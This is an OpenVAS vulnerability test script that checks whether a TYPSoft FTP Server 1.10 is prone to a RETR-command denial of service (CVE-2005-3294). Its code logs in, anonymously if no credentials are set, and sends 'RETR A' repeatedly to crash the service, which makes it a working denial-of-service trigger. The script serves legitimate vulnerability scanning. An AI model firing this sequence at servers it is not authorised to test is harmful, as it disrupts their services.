###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_typsoft_ftp_server_retr_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# TYPSoft FTP Server RETR CMD Denial Of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to cause a denial of
  service.
  Impact Level: Application";
tag_affected = "TYPSoft FTP Server Version 1.10";
tag_insight = "The flaw is due to an error in handling the RETR command, which can
  be exploited to crash the FTP service by sending multiple RETR commands.";
tag_solution = "No solution or patch is available as of 4th January, 2011. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/ftpserv/";
tag_summary = "The host is running TYPSoft FTP Server and is prone to denial of service
  vulnerability.";

if(description)
{
  script_id(801687);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-01-08 10:30:18 +0100 (Sat, 08 Jan 2011)");
  script_cve_id("CVE-2005-3294");
  script_bugtraq_id(15104);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("TYPSoft FTP Server RETR CMD Denial Of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/17196");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15860/");
  script_xref(name : "URL" , value : "http://www.exploitlabs.com/files/advisories/EXPL-A-2005-016-typsoft-ftpd.txt");

  script_description(desc);
  script_summary("Determine if TYPSoft FTP is prone to denial of service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("ftp_func.inc");

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(! get_port_state(ftpPort)){
  exit(0);
}

# Get the FTP banner
banner = get_ftp_banner(port:ftpPort);
if("TYPSoft FTP Server" >!< banner){
  exit(0);
}

## Open FTP Socket
soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

# Check for the user name and password
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## Try for anomymous user
if(!user){
  user = "anonymous";
  pass = "openvas@";
}

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(login_details)
{
  for(i=0; i<5; i++)
  {
    ## Sending Attack
    response = ftp_send_cmd(socket:soc, cmd:"RETR A");

    ## Check Socket status
    if(! response)
    {
      security_warning(port:ftpPort);
      exit(0);
    }
  }
}
ftp_close(socket:soc);
